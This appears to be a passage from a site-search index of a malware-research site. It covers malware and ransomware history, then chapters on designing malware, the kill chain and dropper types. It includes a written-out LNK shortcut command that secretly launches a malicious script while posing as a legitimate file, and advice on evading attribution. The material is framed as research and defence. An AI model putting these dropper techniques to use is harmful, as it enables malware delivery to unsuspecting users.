is sacred, and no one is safe. (OpenOffice and LibreOffice are still excellent alternatives for those looking to kick their Microsoft habit.)</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#from-olympus-with-love","title":"From Olympus With Love","text":"<p>In 2007, the Zeus banking trojan was unleashed on Windows systems. The malware stole banking information via keystroke logging, and spread to about 3.6 million systems in the U.S. alone. When the malware ring was busted, over 100 people were charged with conspiracy to commit bank fraud and launder money, having stolen approximately US$70 million.</p> <p>The original author was never caught, and is believed to have retired in 2010.</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#infect-your-treasured-memories-today","title":"Infect Your Treasured Memories Today","text":"<p>In 2008, the Mocmex trojan spread via digital photo frames, infecting computers to which the frames were attached. The malware employed complex anti-detection mechanisms and disabled system protections, all so it could steal passwords for online game accounts.</p> <p>Industry experts called it the \"nuclear bomb of malware,\" proving once again that industry experts have a flair for the dramatic.</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#malware-for-everyone","title":"Malware for Everyone!","text":"<p>2008 also saw the Bohmini.A RAT, which exploited Adobe Flash\u2014a notoriously-insecure software that just refused to die until Adobe finally killed it in 2021.</p> <p>In July, the Koobface worm spread across users of Facebook and Myspace, as well as other social networks, infecting Windows, Mac OS X and Linux indiscriminately. Much to the chagrin of its designers, Koobface's notoriety was soon overshadowed by that of Conficker, a worm that infected up to 15 million systems, including numerous government, military, police and hospital networks. Four of Conficker's creators were arrested, but only one served time, spending four years in prison.</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#tracking-trends","title":"Tracking Trends","text":"<p>Malware, as with everything, is subject to trends. For each new strain that breaks the mold, a dozen copy-cats will spring up in its wake. Malware authors are pragmatic. \"If it ain't broke, don't fix it.\" An entire decade of email worms propagated via <code>.vbs</code> email attachments, preying on gullible users. Microsoft failed to prevent these attacks, so they just kept coming. There may have been a few creative malware authors out there, but the vast majority just copied each other's work, making only minor tweaks to existing code.</p> <p>The same is true today. The \"malware du jour\" may have shifted from RATs to worms to ransomware, but everyone's still playing \"follow the leader,\" parroting popular paradigms in malware design. Every time a new 0-day drops, malware authors race to exploit it for as long as possible, while software developers struggle to patch their software. Once the bug is patched, malware authors bide their time awaiting the next big 0-day, when they can do it all again. In fact, so many attackers employ similar tactics that in 2013, MITRE created the ATT&amp;CK framework to document them all.</p> <p>Naturally, the ATT&amp;CK framework is an excellent resource for aspiring pentesters and malware authors/analysts, providing excellent documentation of common Tactics, Techniques and Procedures (TTPs). If you haven't yet, you should check it out. It's not as deep a rabbit-hole as TVTropes, the \"all-devouring pop-culture wiki,\" but you could still get lost for hours, exploring all the data on MITRE's site.</p> <p>(No, I'm not sponsored by MITRE. Though I wouldn't turn down their money... \ud83d\udc40)</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/","title":"05 Ransomware Rising","text":"<p>\"Heck, what's a little extortion among friends?\" ~Bill Watterson</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#waledac-spam-attack","title":"Waledac Spam Attack","text":"<p>To kick off the 2010s, researchers discovered the Waledac botnet, which had infected 70-90 thousand systems, sending over 1.5 billion spam emails per day before it was shut down.</p> <p>This sounds like a lot\u2014and it is\u2014but this only accounted for 1% of the total global spam volume at the time. Think about that. In 2010, there were 150 billion spam emails being sent every day. There were only 7 billion people on the planet at the time, and only 2 billion people online, which means each user (on average) got about 27 thousand spam emails per year.</p> <p>That's about 104 spam emails each day, Monday through Friday, 52 weeks a year. Plus holidays.</p> <p>And each day, one of those emails came from Waledac.</p> <p>That's so much spam.</p> <p></p> <p>Does anyone actually like spam emails? I don't. I've never heard someone say, \"I'm so glad I got that spam email. It really brightened my day.\" It's not just annoying, it's wasteful; think of all the electricity and hardware and bandwidth being used for all that spam. It's almost as wasteful as cryptocurrency\u2014and nowhere near as interesting.</p> <p>I'm not sure why anyone would admit to being a spammer, let alone rap about it, but YTCracker gets about 8.5 thousand listeners per month on Spotify. I guess there's a market for it.</p> <p>I digress.</p> <p>To take down Waledac, Microsoft worked with the U.S. government to take down 273 internet domains used by the botnet. \"At Microsoft,\" a spokesperson said, \"we don't accept the idea that botnets are a fact of life.\" Unfortunately, the facts of life don't require Microsoft's acceptance; Waledac was not the first botnet, nor was it the only active botnet at the time. In fact, the world has been plagued by botnets non-stop since the dawn of the 21st century. The Bagle botnet from 2004 was still active in 2010, and in 2022, at the time of this writing, users were still being infected by the ZeroAccess botnet that was originally discovered in 2011\u2014eleven years prior. And they're only getting bigger.</p> <p>Whether we accept it or not, botnets and spam are here to stay.</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#stuxnet","title":"Stuxnet","text":"<p>In 2010, the Stuxnet trojan targeted Iranian nuclear facilities, becoming the first worm to attack SCADA systems. Researchers believe Stuxnet development began in 2005, and was part of a joint operation between the United States and Israel called \"Operation Olympic Games,\" though neither country has openly admitted involvement.</p> <p>The New Yorker called Stuxnet \"the first formal offensive act of pure cyber sabotage by the United States against another country,\" though when president George W. Bush began the project in 2006, he believed it was the only way to prevent conventional attacks on Iranian nuclear facilities, achieving (per The New York Times) \"what until then could be accomplished only by bombing a country or sending in agents to plant explosives.\"</p> <p>Despite their best efforts to avoid collateral damage, the Stuxnet developers made an error, which allowed the worm to spread to computers beyond the scope of the original mission. This was how the worm became exposed to the public, after which researchers at Symantec and Kaspersky Lab examined the worm and revealed its secrets to the world.</p> <p>Stuxnet included rootkit functionality, employed zero-day exploits, and was digitally signed with legitimate certificates stolen from Realtek and JMicron, enabling it to masquerade as legitimate software from trusted vendors. Most importantly, it proved that malicious software could cause real, physical damage. (More on this later.)</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#some-other-stuff","title":"Some Other Stuff","text":"<p>I know you're itching to get to the ransomware, but first I should cover some other stuff that happened in the 2010s.</p> <ul> <li>2010<ul> <li>Psyb0t worm infected routers and modems.</li> </ul> </li> <li>2011<ul> <li>Duqu worm, possibly related to Stuxnet, attempted to infect and gather information from industrial control systems.</li> </ul> </li> <li>2012<ul> <li>Flame continued the trend of malware used for cyber espionage, targeting Middle-Eastern government and educational institutions, as well as specific individuals.</li> <li>Shamoon was a destructive malware which targeted national oil companies, deemed \"the biggest hack in history\" by CNN.</li> </ul> </li> <li>2013<ul> <li>Gameover ZeuS was a banking trojan and keylogger, stealing credentials to online banking accounts.</li> </ul> </li> <li>2014<ul> <li>Regin, a dropper malware, was used by the NSA and GCHQ to spy on European governments, mostly in Russia and Saudi Arabia.</li> </ul> </li> <li>2016<ul> <li>The MEMZ trojan, designed as a prank for a YouTube video series featuring \"Viewer-Made Malware,\" caused infected systems to become unusable, requiring a complete reinstallation of Windows.</li> <li>Tiny Banker was another banking trojan, designed to steal credentials for over two dozen financial websites.</li> <li>The Mirai Botnet infected IoT devices worldwide, using infected devices to launch large-scale DDoS attacks against high-profile targets. The botnet inspired American musician James Ferraro to write an extended play where the Mirai botnet is humanity's savior.</li> </ul> </li> <li>2017<ul> <li>In April, the Shadow Brokers released a trove of stolen NSA exploits, including EternalBlue, which became hugely popular with malware authors, as it provided an easy (and wormable) infection vector for Windows systems.</li> </ul> </li> <li>2019<ul> <li>The Titanium Backdoor was discovered, written by the PLATINUM APT. It employed a complex infection sequence, including hiding data in PNG images with steganography.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#the-prodigal-malware-returns","title":"The Prodigal Malware Returns","text":"<p>Remember Dr. Popp's AIDS trojan from back in '89? It was the world's first ransomware, yet it didn't even encrypt users' files! It just scrambled the directory structure. What a laugh! And the author expected victims to mail ransom checks to a P.O. box in Panama! As if the authorities couldn't just watch that mailbox and arrest whoever collected the money. What a silly idea, right?</p> <p>Well, not exactly.</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#the-problem","title":"The Problem","text":"<p>While Dr. Popp's malware had its flaws, the most grievous among them was its poor timing. You see, Dr. Popp was a couple decades too early. He wasn't alone, either; in the years following, there were a handful of other ransomware attacks, but few were very successful. Setting aside careless design flaws, such as reusing the same hard-coded encryption password across every single infected host (I'm looking at you, Archiveus), all ransomware had one common problem: currency exchange. For example, PGPCoder (released in 2006) depended on e-gold and Liberty Reserve, and Archiveus required victims to purchase specific items from designated third-party websites. Each had their problems:</p> <ul> <li>E-gold was known to report criminal activity to the authorities, which made it a poor choice for criminals. Yet by 2007, the service had a reputation for catering to international terrorists and child pornographers, and were shut down by the feds.</li> <li>Liberty Reserve began in 2006, the same year its founder was charged with violating New York State banking laws with his previous digital currency venture, Gold Age. After fleeing the United States to settle in Costa Rica, he founded Liberty Reserve, which operated without a license and was shut down by government officials in 2013.</li> <li>Third-party marketplaces like Amazon and Ebay are regularly abused by criminals for credit fraud and money laundering schemes, but they have strong anti-fraud departments that work with law enforcement agencies. This type of fraud is complicated by the fact that merchant accounts are tied to specific individuals, businesses and/or financial institutions, making criminal anonymity challenging.</li> </ul> <p>Without a secure, anonymous means of currency exchange, ransomware was unsustainable.</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#the-solution","title":"The Solution","text":"<p>In 2008, an unknown author, going by the pseudonym Satoshi Nakamoto, published a paper titled Bitcoin: A Peer-to-Peer Electronic Cash System. In it, he described a new digital currency that would be free from the control of governments and banks. He also described a peer-to-peer network that would allow users to send and receive payments without the need for a trusted third party. The paper was published on a cryptography mailing list, and was met with skepticism. But the idea caught on, and in 2009, the first Bitcoin transaction was made. At the time, few realized the implications of this new technology. In early 2013, a single Bitcoin was worth about $13. By year's end, the value had increased nearly 100 times, peaking at $1,100. What caused this sudden spike in value?</p> <p>One word: Crime.</p> <ul> <li>The Silk Road, launched in 2011, became the largest online marketplace for illegal products and services worldwide. It was also the first major marketplace to accept Bitcoin as payment.</li> <li>In October 2013, as the site was reaching critical mass, the FBI shut it down and arrested its founder, Ross Ulbricht, seizing 144,000 Bitcoins, worth about $28 million at the time. As the Silk Road bust made headlines, numerous copycat marketplaces popped up, and Bitcoin's popularity exploded.</li> <li>At the start of November, the value of one Bitcoin was around $200. On November 18, the U.S. Senate Committee declared Bitcoin a legitimate currency, and the value jumped to over $1,000 by the end of the month.</li> </ul> <p>The world finally had a decentralized, anonymous digital currency that was widely accepted as legitimate and free from government control. It was the perfect solution for ransomware.</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#when-opportunity-strikes","title":"When Opportunity Strikes...","text":"<p>Unlike Dr. Popp, the authors of CryptoLocker\u2014the world's first truly successful ransomware\u2014had impeccable timing. They began their attack in September 2013, infecting systems, encrypting files, and demanding payment for decryption. Unlike their predecessors, CryptoLocker accepted payments in Bitcoin, capitalizing on the currency's newfound popularity. While the value of the ransoms remained somewhat steady (around USD$400), the dramatic rise in Bitcoin's value magnified CryptoLocker's profits. In October, the $400 ransom payment came out to about 2 Bitcoins. By year-end, those two Bitcoins were worth about $2,000.</p> <p>By the time CryptoLocker was shut down in 2014, it was estimated to have collected nearly 42 thousand Bitcoins, worth about $27 million at the time. (In 2022, that same amount of Bitcoin would be worth nearly $1 billion.) The extortion cost victims about USD$3 million, but Bitcoin's rise magnified that profit by a factor of 9.</p> <p>As of the time of this writing, only one person has been charged with CryptoLocker's creation, and he still hasn't been arrested. The FBI has offered a $3 million reward for information leading to his arrest.</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#i-want-off-this-ride","title":"I Want Off This Ride","text":"<p>CryptoLocker was just the beginning. Following its success, countless new ransomware variants have sprung up. In 2016, Symantec declared ransomware \"the most dangerous cyber threat\" for both organizations and individuals. Where CryptoLocker demanded ransoms of only $400, the median ransom payment in the second quarter of 2022 was USD$36,000\u2014nearly 90 times greater.</p> <p>But the cost of ransomware isn't merely financial. In 2017, the \"WannaCry\" ransomware forced British doctors to cancel surgeries and turn patients away. A month later, \"NotPetya\"\u2014which claimed to be ransomware, but was actually a wiper\u2014caused hospitals in Virginia and Pennsylvania to turn away patients whose records they could not access.</p> <p>In 2019, 794 healthcare providers in the U.S. alone were infected with ransomware. According to reports, \"emergency patients were turned away from hospitals, medical records were inaccessible and in some cases permanently lost, surgical procedures were canceled, tests [were] postponed and 911 services [were] interrupted.\" In Germany, after being hit by a ransomware attack, a hospital re-routed an emergency patient to another hospital 20 miles away. The patient died on the way. Authorities later determined that the ransomware wasn't to blame.</p> <p>However, earlier that year, a similar ransomware attack hit a hospital in Alabama. Vital systems were taken offline, including important medical devices. A week later, a woman went to the hospital to deliver her baby, and the hospital admitted her, despite having not yet recovered from the attack. With their systems offline, medical teams could not monitor vital signs effectively. As a result, they missed a preventable complication that led to the death of the baby.</p> <p>Now, granted, the hospital should have at least informed the patient of their compromised systems before admitting her, so she could have chosen to go elsewhere. But the fact remains that, had it not been for the ransomware attack, the baby would likely have survived.</p> <p>Following the news, in 2020, a slew of ransomware groups claimed that they would no longer attack hospitals. This was welcome news, especially in light of the emerging Covid pandemic, which was already overwhelming hospitals worldwide. Yet by year-end, 34% of healthcare organizations were hit by ransomware, rising to 66% in 2021. Considering that among all organizations hit by ransomware, those in the healthcare industry are the most likely to pay the ransom, it's likely that this number will continue to rise.</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#ransomware-in-the-2010s","title":"Ransomware in the 2010s","text":"<p>Here's a quick rundown of the notable ransomware attacks that happened during the 2010s:</p> <ul> <li>2012<ul> <li>Reveton spread throughout systems in Europe, the U.S. and Canada, typically locking down systems with messages claiming to be from law enforcement agencies tasked with fighting piracy and child pornography, demanding payment for the release of the system.</li> </ul> </li> <li>2013<ul> <li>CryptoLocker was the first ransomware to accept Bitcoin payments, contributing heavily to its success.</li> </ul> </li> <li>2014<ul> <li>CryptoLocker.F and TorrentLocker were released, initially targeting Australian users, though they quickly spread worldwide.</li> <li>CryptoWall not only encrypted files, but also deleted backups, making it impossible to recover without paying the ransom. In addition, it installed spyware which stole passwords and Bitcoin wallets, causing estimated losses around USD$18 million by mid-2015.</li> </ul> </li> <li>2015<ul> <li>Mobile ransomware Fusob was released, targeting Android devices. It posed as a pornographic video player, then poses as an accusatory authority, threatening fictitions charges if the ransom isn't paid.</li> </ul> </li> <li>2016<ul> <li>Petya was released, infecting the master boot record of affected systems. It did not spread very far, but became the foundation for future attacks.</li> <li>SamSam was the first wormable ransomware (or \"ransomworm\"), targeting JBoss servers and brute-forcing weak RDP passwords.</li> <li>ZCryptor was yet another ransomworm, encrypting users' files before infecting external storage and flash drives.</li> <li>Stampado was a ransomware-as-a-service (RaaS) that was sold on the dark web for as little as USD$39 for a lifetime license. While not the first RaaS, it was definitely the cheapest.</li> </ul> </li> <li>2017<ul> <li>With the help of the EternalBlue exploit (mentioned previously), the WannaCry ransomware spread worldwide, infecting over 230,000 systems in 150 countries. While it wasn't the first ransomware to use a worm-like propagation method, it was the first to spread on such a massive scale.</li> <li>NotPetya was released, infecting systems in Ukraine, Russia, and other Eastern European countries. Despite being derived from Petya, it was not actually ransomware, but a wiper, designed to destroy data. Like WannaCry, it spread using EternalBlue.</li> <li>BadRabbit, following on the heels of its predecessors, affected systems in a similar manner to Petya and WannaCry, encrypting file tables. It did not use EternalBlue, instead attempting to spread via fake Adobe Flash updates, and was halted within a few days of its discovery.</li> <li>Syskey was removed from Windows 10 and Windows Server 2017 after being used in ransomware attacks. The utility, added to Windows NT in 2001, was designed by Microsoft to protect systems and sensitive data by encrypting the SAM database. Attackers posed as remote tech support, then locked victims out of their systems, demanding ransoms for passwords.<ul> <li>This proved that even legitimate software can sometimes be malware.</li> <li>It took about six years after attacks were reported for Microsoft to officially drop <code>Syskey</code>.</li> <li>In comparison, Adobe didn't officially terminate Flash until the first day of 2021, despite nearly two decades of constant abuse and vulnerabilities that just refused to go away.</li> </ul> </li> </ul> </li> <li>2018<ul> <li>GandCrab arrived, then was raided after two months. The group persisted, retiring in July 2019 (though their ransomware continued to propagate until at least November).</li> </ul> </li> <li>2019<ul> <li>REvil (a.k.a. Sodinokibi) formed, quickly becoming one of the major players in the ransomware-as-a-service market. Turns out, they were GandCrab all along.</li> </ul> </li> </ul> <p></p> <p>You're not fooling anyone, GandCrab.</p>"},{"location":"ScriptSharks.com/0x00%20History/05%20Ransomware%20Rising/#looking-ahead","title":"Looking Ahead","text":"<p>In the early days, malware was fairly simple, and could be arranged into tidy taxonomies. (This one is a trojan; that one is a worm.) Today, however, malware has become more complex, and its shapes have shifted. What were previously considered separate categories of malware are now more like characteristics, flavors that can be mixed and matched in different combinations to achieve different results. A single attack may involve numerous smaller stages, each with its own purpose and payload. A single piece of malware may be able to perform multiple functions, and may alter its code to adapt to its environment.</p> <p>For example, the news may report a ransomware attack, but the ransomware is only one part of the attack chain; an initial stager may be attached to spam emails sent by a botnet of hosts infected with remote-access trojans. The stager may act as a dropper, downloading a modular \"implant\" that can be configured to perform a variety of tasks, including installing additional malware, stealing data, expanding the botnet, or even launching a distributed denial-of-service (DDoS) attack. The implant may then download the actual ransomware payload, which could also double as a wiper if necessary. Weeks later, someone might drop a 0-day, and the authors may create a new implant module, enabling it to spread as a worm. And so on.</p> <p>Malware is a constantly-evolving, ever-changing beast. Survival depends on our knowledge of the past, awareness of the present, and anticipation of the future. We must study, stay vigilant, be prepared.</p> <p>And never, ever pay the ransom.</p>"},{"location":"ScriptSharks.com/0x10%20Design/10%20Introduction/","title":"10 Let's Write Some Malware!","text":"<p>\u201cWith how many things are we on the brink of becoming acquainted, if cowardice or carelessness did not restrain our inquiries?\u201d ~Mary Shelley, Frankenstein</p>"},{"location":"ScriptSharks.com/0x10%20Design/10%20Introduction/#wait-really","title":"Wait... Really?","text":"<p>Absolutely! To be a successful malware researcher, one must understand malware design. Likewise, every successful malware designer must also be a researcher. The two are inextricable; the only distinction between analysts and adversaries is how they apply their knowledge and skill. Do they help others, or do they harm them?</p> <p>I'm in the \"help others\" camp; I hope you are, too. One cannot defeat what one does not understand. The best way to understand malware is to design your own.</p> <p>The following sections will provide an overview of a variety of malware design techniques. They are a reference, not a tutorial, and do not follow a linear trajectory. This repository will grow during the course of my research, as I document new discoveries. I hope you will contribute, too! If you have a technique you'd like to share, please open an issue or pull request on GitHub.</p>"},{"location":"ScriptSharks.com/0x10%20Design/10%20Introduction/#isnt-this-illegal","title":"Isn't this illegal?","text":"<p>Good question! To start, let me say I am not a lawyer, and you should consult your local laws before writing, compiling, or distributing malware. I am not responsible for any legal consequences you may face as a result of your actions.</p> <p>That said, there are countless malware researchers and red-team operators who have written, compiled, and deployed malware without any legal repercussions. Some people even sell their malware as a commercial product!</p> <p>Generally speaking, designing and documenting malicious source code is safe, especially within the context of research. Compiling the code into live malware samples is also (relatively) safe, as long as the samples are kept in quarantine or deployed under controlled conditions to systems you personally own, or those to which you have explicit permission to deploy malware.</p> <p>They key here is consent. The moment your malware runs on a system without the owner's consent, you have crossed the line into criminal activity, even if the malware causes no real harm. If you are unsure about the legality of your actions, consult a lawyer.</p>"},{"location":"ScriptSharks.com/0x10%20Design/10%20Introduction/#that-said","title":"That said...","text":"<p>This site will not provide the complete source code for any malware samples. Instead, we will provide code snippets focused on demonstrating specific techniques. This is for two reasons: first, snippets are easier to understand than full programs; second, we don't want to provide skids with easy fodder. If you want to write malware, you'll have to do the hard work yourself. (Or check out one of the pre-made, open-source frameworks, like Metasploit, Veil, or Empire.)</p>"},{"location":"ScriptSharks.com/0x10%20Design/11%20Overview/","title":"11 Malware Design Overview","text":"<p>\"Good writers borrow, great writers steal.\" ~T.S. Eliot</p>"},{"location":"ScriptSharks.com/0x10%20Design/11%20Overview/#steal-everything","title":"Steal Everything","text":"<p>Want to create effective malware quickly? Steal code from other malware! This is a common practice among malware authors, for many good reasons:</p> <ul> <li>You can focus on the interesting parts of your codebase, rather than implementing everything from scratch.</li> <li>You can learn a great deal from reading other people's code, which will make you a better malware author.</li> <li>Identification and attribution become more difficult when a sample includes code from multiple sources.</li> <li>Your malware can gain new abilities by splicing in other malware's code, like a Frankensteinian abomination.</li> </ul> <p>I'll add one caveat: If you're going to publish or sell your malware or its source code, please don't steal from commercial, legitimate \"malware\" products like Cobalt Strike. And if you use code from open-source projects, please give credit where credit is due. Criminal malware authors regularly steal without attribution, but that doesn't make it right; if you steal code from a criminal malware sample, then discover it was originally stolen from a legitimate project, be sure to give credit to the original author and, if necessary, remove or rewrite the offending code.</p> <p></p>"},{"location":"ScriptSharks.com/0x10%20Design/11%20Overview/#know-your-kill-chain","title":"Know Your Kill Chain","text":"<p>In the early days, malware was relatively simple, involving just one or two stages in a single executable. Today, malware is more complex, often involving multiple modular stages, each with its own unique purpose. The stages can be chained together, each performing a specific task in support of the attacker's objectives. This design has arisen to support the attacker's \"kill chain,\" a series of actions aimed at achieving specific goals.</p>"},{"location":"ScriptSharks.com/0x10%20Design/11%20Overview/#martin-and-mitre","title":"Martin and Mitre","text":"<p>The \"kill chain\" was originally a military concept describing the structure of an attack. The \"cyber kill chain,\" a derivative concept developed by Lockheed Martin, describes the steps required to achieve a cyber objective, such as stealing data, installing a backdoor, or launching a denial-of-service attack. Multiple alternative models have been devised, including the MITRE ATT&amp;CK framework, a community-driven project highly regarded throughout the security industry. The ATT&amp;CK framework includes the following stages:</p> <ol> <li>Reconnaissance</li> <li>Resource Development</li> <li>Initial Access</li> <li>Execution</li> <li>Persistence</li> <li>Privilege Escalation</li> <li>Defense Evasion</li> <li>Credential Access</li> <li>Discovery</li> <li>Lateral Movement</li> <li>Collection</li> <li>Command and Control</li> <li>Exfiltration</li> <li>Impact</li> </ol> <p>Each stage is broken down further into tactics and techniques. For example, the \"Initial Access\" stage includes the following tactics, each with their related techniques:</p> <ul> <li>Drive-By Compromise</li> <li>Exploit Public-Facing Application</li> <li>External Remote Services</li> <li>Hardware Additions</li> <li>Phishing</li> <li>Replication Through Removable Media</li> <li>Supply Chain Compromise</li> <li>Trusted Relationship</li> <li>Valid Accounts</li> </ul>"},{"location":"ScriptSharks.com/0x10%20Design/11%20Overview/#breaking-it-down","title":"Breaking it Down","text":"<p>It is foolish to attempt to cover every posible stage, tactic and technique in a single malware payload. Instead, most malware authors focus on specific stages and techniques, deploying multiple payloads to achieve their goals. For example, a ransomware attack may employ the following techniques:</p> <ol> <li>Reconnaissance<ul> <li>Identify the target's organizational structure, including the names of key personnel.</li> <li>Gather email addresses for key personnel and related individuals.</li> </ul> </li> <li>Resource Development<ul> <li>Create or obtain malware samples.</li> <li>Stage malware on remote servers with deceptive domain names.</li> </ul> </li> <li>Initial Access<ul> <li>Send phishing emails with malicious links or attachments.</li> <li>Links and attachments aim to launch stager code.</li> </ul> </li> <li>Execution<ul> <li>Stager code downloads and executes the main payload.</li> </ul> </li> </ol> <p>Once the main payload is executed, it will typically deploy a command-and-control module, which will then use additional modules to handle persistence, privilege escalation, lateral movement, etc. This is a common design pattern, employed by countless malware families. In the case of ransomware, the malware will typically deploy data exfiltration and encryption modules, designed to steal and encrypt the victim's data.</p>"},{"location":"ScriptSharks.com/0x10%20Design/11%20Overview/#droppers-stagers-payloads-and-modules","title":"Droppers, Stagers, Payloads and Modules","text":"<p>Modern malware is typically divided into a few distinct components:</p> <ul> <li>Droppers: A self-contained package designed to deliver and launch a malware stager.</li> <li>Stagers: Lightweight code designed to install a malware payload onto a system.</li> <li>Payloads: Typically a C2 implant, providing remote command and control to attackers.</li> <li>Modules: Single-purpose, specialized code, designed for use with a modular C2 implant.</li> </ul> <p>We will explore each component in more detail in the following sections.</p>"},{"location":"ScriptSharks.com/0x10%20Design/11%20Overview/#dont-infect-yourself","title":"Don't Infect Yourself","text":"<p>Mistakes happen. Even the most careful malware authors can accidentally infect their own systems. If you're going to write malware, you need to take precautions against self-infection. Here are some tips:</p> <ul> <li>Use virtual machines. If you're using cloud services, use disposable VMs, such as Google's Spot VMs.</li> <li>Avoid developing, building and testing malware on your primary workstation.</li> <li>Use separate VMs for coding, building and testing, to avoid cross-contamination.</li> <li>Use a separate network for testing, and disable all external network access to the testing VM.</li> <li>Keep regular, redundant backups of your VMs and other essential data, and test your backups regularly.</li> <li>\"De-claw\" your malware during testing, using benign placeholders for dangerous components whenever possible.</li> <li>When testing propagation techniques, use a limited scope to prevent accidental infection.</li> <li>Disconnect shared drives and network shares when testing malware.</li> </ul>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/00%20Intro/","title":"What's a Dropper?","text":"<p>A dropper is a small, self-contained mechanism for delivering a malware stager to a target system. Like a gift-wrapped box, it is designed to entice users to open it and retrieve the gift inside. Droppers and stagers are often coupled, and the terms are often used interchangeably, but I prefer to make a distinction between the two.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/00%20Intro/#core-features","title":"Core Features","text":"<p>Malware droppers should aim for the following features:</p> <ul> <li>Small size. Droppers should be as small as possible, to minimize the amount of data that must be downloaded. This is especially important for droppers that are delivered via email, where the size of the attachment is limited.</li> <li>Self-contained. Droppers should be self-contained, meaning that they do not require an internet connection, nor any non-standard files or libraries, in order to function. This allows droppers to function on as many systems as possible.</li> <li>Low-privilege. Droppers should run without administrative privileges, so they can be executed even by unprivileged users.</li> <li>Non-malicious. Droppers should not take any malicious actions on their own. Their sole purpose is to deliver a stager to a target system. This helps to avoid detection and prevention by system security software.</li> <li>Stager-independent. Droppers should be decoupled from the stagers they deliver, so that components can be replaced with minimal effort.</li> </ul>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/00%20Intro/#dropper-examples","title":"Dropper Examples","text":""},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/00%20Intro/#the-maldoc","title":"The Maldoc","text":"<p>When it comes to dropper design, simplicity is key. Historically, Microsoft Office was one of the most popular tools for creating malware droppers. This was partly due to the suite's global popularity, as well as the inclusion of a built-in scripting language, VBA.</p> <p>Creating a \"maldoc\" dropper was fairly simple. To start, the attacker would have a malware stager, often in the form of a PowerShell script, which could be delivered as a \"one-liner\" or as a script. The attacker would then create a Microsoft Word or Excel document, and embed the stager in the document as a VBA macro. When opened, the maldoc would execute the embedded macro-script, which would in turn launch the stager.</p> <p>This approach was highly effective due to the prevalence of Mirosoft Office in corporate environments. Employees commonly sent and received Office documents via email as part of their job duties, so they rarely thought twice about opening a maldoc.</p> <p>However, in July of 2022, Microsoft released a patch that disabled VBA macros by default, which crippled the effectiveness of \"maldoc\" droppers. In response, threat actors have migrated to other dropper techniques.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/00%20Intro/#the-lnk-dropper","title":"The LNK Dropper","text":"<p>Malware authors are quite familiar with abusing Microsoft Windows Shortcut (<code>.lnk</code>) files. In 2010, attackers abused a Windows 0-day to distribute the Stuxnet Worm. In 2012, hackers used <code>.lnk</code> files to steal password hashes from unsuspecting users. In 2013, <code>.lnk</code> files were used to recombine fragmented malware prior to execution. In 2014, malware authors used <code>.lnk</code> files to launch malware which had been renamed with benign-looking file extensions, such as <code>.pdf</code> and <code>.doc</code>. This was possible because <code>cmd.exe</code> used the <code>CreateProcess</code> API, which checked for the presence of PE headers, rather than using the file's extension, to determine how it should be handled.</p> <p>In 2015, attackers used <code>.lnk</code> files to hide malware execution on target systems. The method was pretty straightforward:</p> <ol> <li>Set the \"hidden\" attribute of a legitimate file or directory on the target system, so that the user can no longer see it.</li> <li>Drop a malicious script or executable on the system, also hidden.</li> <li>Create a <code>.lnk</code> file which masquerades as the legitimate file or directory, but which launches the malware before opening the expected file.</li> </ol> <p>This was as simple as creating a shortcut, then modifying its \"target\" attribute to point to <code>cmd.exe</code> with a crafted command line, like so:</p> <pre><code>cmd.exe /c start malware.vbs &amp; start legit_file.exe &amp; exit\n</code></pre> <p>This would launch <code>malware.vbs</code>, then <code>legit_file.exe</code>, and then exit. To an unobservant user, it would appear as if the shortcut was simply opening the expected file.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/00%20Intro/#the-iso-dropper","title":"The ISO Dropper","text":"<p>Much like ZIP files, ISO files are archives that wrap multiple files into one. ISOs were originally designed for creating backups of optical media, such as CD-ROMs. In early versions of Windows, users had to install special third-party tools in order to work with ISO files. This changed in 2012, when Microsoft added native ISO support to Windows 8, allowing users to be mount ISO files as virtual drives. By 2017, malware authors were taking full advantage of this feature, using ISO files as a delivery mechanism for malware.</p> <p>The early ISO droppers were fairly simple, containing a malicious <code>.exe</code> file masquerading as an Office document or PDF. Attackers would simply attach the ISO to outbound phishing emails, often masquerading as purchase orders, receipts, or other official-looking documents. Unsuspecting users would open the ISO and execute the malware within. This method was surprisingly effective, considering how little the attackers did to disguise the dropper.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/00%20Intro/#the-html-dropper","title":"The HTML Dropper","text":"<p>Adversaries have been abusing HTML and in-browser scripting languages since the dawn of time (or at least since 1998). This trend continued into the 2010s, and still takes place today. With HTML and JavaScript, attackers can easily create an inconspicuous-looking dropper by embedding a Base64-encoded malware package within a JavaScript wrapper which, when the HTML file is opened, will trigger a \"download\" of the decoded package to the user's hard drive.</p> <p>This dropper method is popular for a number of reasons: it doesn't involve common red-flag file extensions (like <code>.exe</code>, <code>.dll</code>, <code>.ps1</code>, etc.); embedded JavaScript code can be obfuscated to hide their contents from email attachment scanners; and it's easy to mimic the look of a trustworthy website, aiding in deception.</p>"},{"location":"ScriptSharks.com/0x10%20Design/12%20Droppers/10%20Design/","title":"Putting it all Together","text":"<p>In the introduction to droppers, we introduced Maldocs, as well as LNK, ISO and HTML droppers. After maldocs were crippled in 2022, threat actors adopted the other three methods, often in combination. In this section, we'll design our own dropper, mirroring a common attack pattern observed in malicious phishing email 